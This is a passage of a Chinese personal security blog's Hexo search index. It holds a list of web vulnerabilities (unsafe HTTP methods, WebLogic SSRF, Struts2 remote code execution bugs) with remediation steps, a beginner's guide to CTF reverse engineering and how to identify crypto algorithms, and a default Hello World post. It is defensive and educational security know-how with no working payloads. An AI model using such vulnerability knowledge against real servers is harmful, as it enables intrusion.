class="headerlink" title="30.目标服务器启用了不安全 HTTP 方法"></a>30.目标服务器启用了不安全 HTTP 方法</h1><h2 id="漏洞描述-29"><a href="#漏洞描述-29" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　目标服务器启用了不安全的传输方法，如PUT、TRACE、DELETE、MOVE等，这些方法表示可能在服务器上使用了 WebDAV，由于dav方法允许客户端操纵服务器上的文件，如上传、修改、删除相关文件等危险操作，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件。</p><h2 id="修复-28"><a href="#修复-28" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>​       1、关闭不安全的传输方法，只开启POST、GET方法。</p><p>　　2、如果服务器不使用 WebDAV 可直接禁用，或为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码。</p><h1 id="31-weblogic-SSRF服务器请求伪造"><a href="#31-weblogic-SSRF服务器请求伪造" class="headerlink" title="31.weblogic SSRF服务器请求伪造"></a>31.weblogic SSRF服务器请求伪造</h1><h2 id="漏洞描述-30"><a href="#漏洞描述-30" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　目标存在weblogic SSRF服务器请求伪造漏洞。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。Weblogic中间件默认带有“UDDI 目录浏览器”且为未授权访问，通过该应用，可进行无回显的SSRF请求。攻击者可利用该漏洞对企业内网进行大规模扫描，了解内网结构，并可能结合内网漏洞直接获取服务器权限。</p><h2 id="修复-29"><a href="#修复-29" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、若不影响业务则可删除uddiexplorer文件夹</p><p>　　2、限制uddiexplorer应用只能内网访问</p><h1 id="32-Apache-Struts2-远程代码执行漏洞（S2-019）"><a href="#32-Apache-Struts2-远程代码执行漏洞（S2-019）" class="headerlink" title="32.Apache Struts2 远程代码执行漏洞（S2-019）"></a>32.Apache Struts2 远程代码执行漏洞（S2-019）</h1><h2 id="漏洞描述-31"><a href="#漏洞描述-31" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　Apache Struts2的“Dynamic MethodInvocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，如果未关闭此机制将导致远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p><h2 id="修复-30"><a href="#修复-30" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载。</p><p>　　2、或者手工设置struts.xml文件&lt;constantname=”struts.enable.DynamicMethodInvocation”value=”false”/&gt;</p><h1 id="33-Apache-Struts2-远程代码执行漏洞（S2-037）"><a href="#33-Apache-Struts2-远程代码执行漏洞（S2-037）" class="headerlink" title="33.Apache Struts2 远程代码执行漏洞（S2-037）"></a>33.Apache Struts2 远程代码执行漏洞（S2-037）</h1><h2 id="漏洞描述-32"><a href="#漏洞描述-32" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　Apache Struts2在使用REST插件时，攻击者可以绕过动态方法执行的限制，调用恶意表达式执行远程代码。</p><h2 id="修复-31"><a href="#修复-31" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　建议用户到官方获取最新补丁或者最新版本程序。</p><h1 id="34-Apache-Struts2-DevMode-远程代码执行漏洞"><a href="#34-Apache-Struts2-DevMode-远程代码执行漏洞" class="headerlink" title="34.Apache Struts2 DevMode 远程代码执行漏洞"></a>34.Apache Struts2 DevMode 远程代码执行漏洞</h1><h2 id="漏洞描述-33"><a href="#漏洞描述-33" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　为了便于开发人员调试程序，Struts2提供了一个devMode模式，可以方便查看程序错误以及日志等信息。当Struts2中的devMode模式设置为true时，存在严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p><h2 id="修复-32"><a href="#修复-32" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　建议用户到官方获取最新补丁或者最新版本程序。</p><p>　　或者将struts.properties中的devMode设置为false，或是在struts.xml中添加如下代码： &lt;constant name=”struts.devMode”value=”false”/&gt;。</p><h1 id="35-Apache-Struts2-远程代码执行漏洞（S2-045）"><a href="#35-Apache-Struts2-远程代码执行漏洞（S2-045）" class="headerlink" title="35.Apache Struts2 远程代码执行漏洞（S2-045）"></a>35.Apache Struts2 远程代码执行漏洞（S2-045）</h1><h2 id="漏洞描述-34"><a href="#漏洞描述-34" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　Apache Struts2的Jakarta Multipartparser插件存在远程代码执行漏洞，漏洞编号为CVE-2017-5638。攻击者可以在使用该插件上传文件时，修改HTTP请求头中的Content-Type值来触发该漏洞，导致远程执行代码。</p><h2 id="修复-33"><a href="#修复-33" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　检测方式查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar ，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p><p>　　1、建议用户到官方获取最新补丁或者最新版本程序。</p><p>​        2、更新至Strusts2.3.32或者Strusts2.5.10.1，或使用第三方的防护设备进行防护。</p><p>　　3、临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p><p>　　4、修改WEB-INF/classes目录下的配置</p><p>　　在WEB-INF/classes目录下的struts.xml中的struts 标签下添加</p><p>　　&lt;constantname=”struts.custom.i18n.resources”value=”global”/&gt;；</p><p>　　在WEB-INF/classes/目录下添加global.properties，文件内容如下:</p><p>　　struts.messages.upload.error.InvalidContentTypeException=1</p><h1 id="36-Apache-Struts2-远程代码执行漏洞（S2-033）"><a href="#36-Apache-Struts2-远程代码执行漏洞（S2-033）" class="headerlink" title="36.Apache Struts2 远程代码执行漏洞（S2-033）"></a>36.Apache Struts2 远程代码执行漏洞（S2-033）</h1><h2 id="漏洞描述-35"><a href="#漏洞描述-35" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　Apache Struts2在开启动态方法调用（DynamicMethod Invocation）的情况下，攻击者使用REST插件调用恶意表达式可以远程执行代码。</p><h2 id="修复-34"><a href="#修复-34" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>　　1、用户到官方获取最新补丁或者最新版本程序。</p><p>　　2、或者在允许的情况下禁用动态方法调用（Dynamic Method Invocation），修改Struts2的配置文件struts.xml，将struts.enable.DynamicMethodInvocation设置为“false”。</p>]]></content>
      
      
      <categories>
          
          <category> ctf类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web常见漏洞及其修复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF逆向的简单了解</title>
      <link href="/2022/01/16/%E9%80%86%E5%90%91/"/>
      <url>/2022/01/16/%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<p>CTF中逆向的简单了解</p><span id="more"></span><h1 id="逆向工程简介及发展方向"><a href="#逆向工程简介及发展方向" class="headerlink" title="逆向工程简介及发展方向"></a>逆向工程简介及发展方向</h1><h2 id="《逆向工程核心原理》"><a href="#《逆向工程核心原理》" class="headerlink" title="《逆向工程核心原理》"></a>《逆向工程核心原理》</h2><p>逆向工程，顾名思义，将已经完成的程序经行反编译以找到其内部隐藏细节的过程，我们将其称之为逆向工程</p><p>第一步，我们将通过各种信息收集工具，对要进行逆向分析的程序进行信息处理</p><p>第二步，我们将存在保护的目标程序经行去加密，并且备份其源文件</p><p>第三步，将目标程序拖入静态分析或动态调试软件中经行处理（代码审计或debug）</p><p>第四步，对收集到的信息进行整合，给目标程序打补丁，实现我们的目的</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-16423386008562.webp"></p><p>在CTF比赛中</p><p>逆向工程是CTF比赛中一个重要的方向</p><p>涵盖了Windows逆向，Linux逆向，Android逆向，密码学逆向等诸多方面，对程序代码进行审计，在关键的位置为程序打上补丁，绕过一些复杂的花指令，逆向工程无疑是最具技术含量的工作，但也因为其本身难度之高，一个好的逆向手是团队中最稀缺的人才。</p><p>逆向工程还是pwn方向的前置知识储备</p><p>所谓“知己知彼，百战不殆”，如果说pwn是信息安全世界中最锋利的武器，那逆向工程就是帮助它识破敌人弱点的锐利眼眸。在进行数据溢出攻击之前，我们要用逆向工程的手法，分析目标程序，找到其关键弱点，一击致命。我们可以说逆向是为pwn服务的工具，也可以说pwn是长了牙齿的逆向工程。</p><p>密码学逆向的独特之处</p><p>CTF中，有一部分逆向工程的题目，其本身流程并不复杂，但用到了高级的密码学加密方式，我个人称这种逆向题目为“密码学逆向”，不需要你有很高的程序阅读能力，但是要找出是哪种加密方式，有怎样的特征值，却是个极其艰巨的任务，所以在遇到这种题目的时候，逆向手往往要和密码学方向合作或者自学密码学。</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-16423386744123-16423386765075.webp"></p><h1 id="主要逆向工具"><a href="#主要逆向工具" class="headerlink" title="主要逆向工具"></a>主要逆向工具</h1><h2 id="各种逆向工具简介"><a href="#各种逆向工具简介" class="headerlink" title="各种逆向工具简介"></a>各种逆向工具简介</h2><p>1.编码转换及解密工具</p><p>编码转换工具是信息安全中最常用的工具，因为题目所给出的“答案”为了迷惑我们，经常会使用编码的方式，隐藏在大量垃圾信息中，防止被轻易发现，因此我们需要对某些有特定编码规则的字符串经行编码转化。</p><p>解密工具，因为有密码学逆向的存在，我们需要去熟悉某些特定的解密方法，并以软件和网站来辅助我们的解密过程</p><p>2.文件类型及查壳</p><p>判断文件类型及查壳工具能帮助我们在开始逆向进行必要的信息收集，帮助我们选择正确的反编译及反汇编工具</p><p>3.去保护</p><p>根据之前收集的信息，为之后的代码审计做准备，使用相关工具和手段尽可能去除软件的反编译保护</p><p>4.静态分析</p><p>静态分析软件一般采用线性扫描和递归遍历的方法，将已经经过编译器编译过生成的可执行文件，反编译成汇编代码或伪C语言代码，在静态分析这个步骤中，我们将使用静态分析软件进一步深入收集目标程序的信息，对目标程序进行修改，理解目标程序的实现逻辑。静态分析和动态调试是逆向工程的主体部分</p><p>5.动态调试</p><p>动态调试是逆向工程中的杀手锏，无论多复杂困难的题目，你都能在动态调试中找到解决它的办法，但动态调试软件同样也是逆向工程中最难上手的软件，通过对逆向深入的学习，当你能熟练地掌握汇编语言基础和动态调试工具的使用后，你就是一个合格的逆向手了。</p><h1 id="Windows逆向"><a href="#Windows逆向" class="headerlink" title="Windows逆向"></a>Windows逆向</h1><h2 id="Windows逆向工具"><a href="#Windows逆向工具" class="headerlink" title="Windows逆向工具"></a>Windows逆向工具</h2><h3 id="1-CaptfEncoder"><a href="#1-CaptfEncoder" class="headerlink" title="1.CaptfEncoder"></a>1.CaptfEncoder</h3><p><em>CaptfEncoder</em>是一款跨平台网络安全工具套件,提供网络安全相关编码转换、古典密码、密码学、特殊编码等工具,并聚合各类在线工具</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-16423389087376.webp"></p><h3 id="2-HexEdit"><a href="#2-HexEdit" class="headerlink" title="2.HexEdit"></a>2.HexEdit</h3><p>HexEditXP是一款实用的文本、代码编辑工具，多用于二进制、十六进制文本的编辑操作，拥有编辑磁盘文件、编辑大型文件、颜色高亮、添加书签以及对指定内容进行复制、粘贴、替换等操作，软件还内置了脚本编辑器功能，方便开发者使用</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-16423391058488-164233910903210.webp"></p><h3 id="3-ExeinfoPe"><a href="#3-ExeinfoPe" class="headerlink" title="3.ExeinfoPe"></a>3.ExeinfoPe</h3><p>Exeinfo PE是一款查看PE文件信息的工具,可以查看EXE/DLL文件的编译器信息、是否加壳、入口点地址、输出表/输入表等等PE信息,帮助开发人员对程序进行分析和逆向</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164233914940111-164233915191813.webp"></p><h3 id="4-die"><a href="#4-die" class="headerlink" title="4.die"></a>4.die</h3><p><em>Detect it Easy</em>是一个多功能的PE-DIY工具,主要用于壳侦测。功能正日益完善,是不可多得的破解利器，支持文件直接拖放，可添加到右键菜单，非常方便!Die和peid一样可以加载插件</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164233919896614-164233920639016.webp"></p><h3 id="5-FFI"><a href="#5-FFI" class="headerlink" title="5.FFI"></a>5.FFI</h3><p>File Format Identifier（超级巡警病毒分析）是一款查壳脱壳工具，同时也是一款病毒分析工具，它可以自动识别文件格式，使用超级巡警的格式识别引擎，集查壳、虚拟机脱壳、PE文件编辑、PE文件重建、导入表抓取(内置虚拟机解密某些加密导入表)、进程内存查看/DUMP、附加数据处理、文件地址转换、PEID插件支持、MD5计算以及快捷的第三方工具利用等功能，适合病毒分析中对一些病毒木马样本进行系统处理。</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164233924106417-164233924440719.webp"></p><h3 id="6-IDA-PRO"><a href="#6-IDA-PRO" class="headerlink" title="6.IDA PRO"></a>6.IDA PRO</h3><p>交互式反汇编器专业版（Interactive Disassembler Professional），人们常称其为IDA Pro，或简称为IDA。是最棒的一个静态反编译软件，为安全分析人士不可缺少的利器！IDA Pro是一款交互式的，可编程的，可扩展的，多处理器的，交叉Windows或Linux WinCE MacOS平台主机来分析程序， 被公认为最好的花钱可以买到的逆向工程利器。IDA Pro已经成为事实上的分析敌意代码的标准并让其自身迅速成为攻击研究领域的重要工具。它支持数十种CPU指令集其中包括Intel x86，x64，MIPS，PowerPC，ARM，Z80，68000，c8051等等。</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164233927641120-164233927968822.webp"></p><h3 id="7-X64DBG"><a href="#7-X64DBG" class="headerlink" title="7.X64DBG"></a>7.X64DBG</h3><p>x64dbg 是 Windows 下的 32 64 位调试器,类似 ollydbg</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164233947346023-164233947545525.webp"></p><h3 id="8-OllyDbg"><a href="#8-OllyDbg" class="headerlink" title="8.OllyDbg"></a>8.OllyDbg</h3><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164233951141926-164233951340728.webp"></p><h2 id="IDA的使用"><a href="#IDA的使用" class="headerlink" title="IDA的使用"></a>IDA的使用</h2><p>想要入门逆向工程，那最正统的路径便是学习怎样使用IDA这个软件，并从这个过程中去学习反编译的技巧和各种逆向方法，但是IDA有两个版本，分别为IDA32和IDA64</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164233971053229-164233971306731.webp"></p><p>想进一步熟悉IDA的使用，我们要从题目入手进一步分析</p><ol><li><p>BUUCTF : easyre（基础）</p></li><li><p>BUUCTF : reverse_1（字符串中无flag）</p></li><li><p>BUUCTF : xor (编写脚本)</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164233977271632-164233977429434.webp"></p></li></ol><h1 id="常见的加密算法"><a href="#常见的加密算法" class="headerlink" title="常见的加密算法"></a>常见的加密算法</h1><h2 id="base64加密"><a href="#base64加密" class="headerlink" title="base64加密"></a>base64加密</h2><p>base64主要是将输入中的每3字节（共 24 bytes）按每 6 bytes分成一组，变成4个小于64的索引值，然后通过一个索引表得到4个可见字符。</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164233985245535-164233985413937.webp"></p><h2 id="TEA算法"><a href="#TEA算法" class="headerlink" title="TEA算法"></a>TEA算法</h2><p>TEA算法是一种常见的分组加密算法，密钥为 128 bytes位，明文为 64 bytes位，主要做了32轮变换，每轮变换都涉及移位和变换。TEA的源码为：</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164233992837838-164233993022540.webp"></p><p>对TEA的识别也比较容易，在TEA算法中有一个固定的常数 0x9e3779b9 或者 0x61c88647，出现这两个特征值时可以以此确定TEA算法。</p><h2 id="AES分组加密法"><a href="#AES分组加密法" class="headerlink" title="AES分组加密法"></a>AES分组加密法</h2><p>AES是常见的分组加密算法，其加解密流程如图。</p><p>AES加密过程涉及4种操作：字节替代（SubBytes），行移位（ShiftRows），列混淆（MixColumns）和轮密钥加（AddRoundKey)</p><p>其中，字节替代过程是通过S盒完成一个字节到另一个字节的映射，S盒和逆S盒具体如下：</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164233999899641-164234000085343.webp"></p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164234004887044-164234005064246.webp"></p><p>如果发现程序中有S盒或者动态生成了S盒,则可以确定采用了AES加密。</p><h2 id="RC4加密"><a href="#RC4加密" class="headerlink" title="RC4加密"></a>RC4加密</h2><p>RC4加密算法属于流加密算法，包括初始化函数和加解密函数，函数代码具体如下：</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164234010203847-164234010417149.webp"></p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164234013008550-164234013266352.webp"></p><p>可以看出，初始化代码对字符数组s进行了初始化赋值，且赋值分别递增，之后又对s进行了256次交换操作。通过识别初始化代码，可以判断为RC4算法。</p><h2 id="MD5消息摘要算法"><a href="#MD5消息摘要算法" class="headerlink" title="MD5消息摘要算法"></a>MD5消息摘要算法</h2><p>MD5消息摘要算法，是一种被广泛使用的密码散列函数，可以产生一个128位的散列值，用于确保消息传输的完整性和一致性。MD5加密的函数大致如下：</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164234018658153-164234018945755.webp"></p><p>其中，MD5Init会初始化四个称作MD5链接变量的整型参数。因此如果看到这4个常数0x67452301，0xefcdab89，0x98badcfe，0x10325476，就可以怀疑该函数是否为MD5算法了。</p><p>MD5Init函数代码如下：</p><p><img src="/2022/01/16/%E9%80%86%E5%90%91/640-164234021669156-164234021826658.webp"></p>]]></content>
      
      
      <categories>
          
          <category> ctf类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021长安“战疫”网络安全卫士守护赛Wp</title>
      <link href="/2022/01/09/WriteUp/"/>
      <url>/2022/01/09/WriteUp/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="48f4f7a3628b6b3e5d4fcc3d7b1c88fea42f7b6575305424266bc7649f1df78b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">尚不完善，暂不公开</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp、 </tag>
            
            <tag> 长安战役 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/12/26/hello-world/"/>
      <url>/2021/12/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.jj20.com%2Fup%2Fallimg%2Ftp01%2F1ZZQ20QJS6-0-lp.jpg&refer=http%3A%2F%2Fimg.jj20.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1649421031&t=94a6f725c49a1cfd40fac80ad62a05e1" alt="点击查看图片来源"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Ffile02.16sucai.com%2Fd%2Ffile%2F2014%2F0827%2Fc0c92bd51bb72e6d12d5b877dce338e8.jpg&refer=http%3A%2F%2Ffile02.16sucai.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1649421031&t=e37a7d57832a8ee3b1d73cee495b9493" alt="点击查看图片来源"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.jj20.com%2Fup%2Fallimg%2F1113%2F032120114622%2F200321114622-4-1200.jpg&refer=http%3A%2F%2Fimg.jj20.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1649653988&t=66907cee94c394ab1430eab6420774e2" alt="点击查看图片来源"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.jj20.com%2Fup%2Fallimg%2Ftp10%2F210926112Z2F31-0-lp.jpg&refer=http%3A%2F%2Fimg.jj20.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1649653988&t=ad6b4b4f3459d908c22e38a7ce716edb" alt="点击查看图片来源"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.jj20.com%2Fup%2Fallimg%2F4k%2Fs%2F02%2F2109242312005c1-0-lp.jpg&refer=http%3A%2F%2Fimg.jj20.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1649653988&t=c467c501382df1ecbba0efed0f06606e" alt="点击查看图片来源"><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202203121339724.gif" alt="点击查看图片来源"></p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202203121339524.gif" alt="点击查看图片来源"></p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202203121341991.gif" alt="点击查看图片来源"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.jj20.com%2Fup%2Fallimg%2Ftp03%2F1Z9202305332143-0-lp.jpg&refer=http%3A%2F%2Fimg.jj20.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1649653988&t=53c6b6a7dfad3fbe5e98af6a5ed55a6e" alt="点击查看图片来源"></p>]]></content>
      
      
      <categories>
          
          <category> 心得类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 心得 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
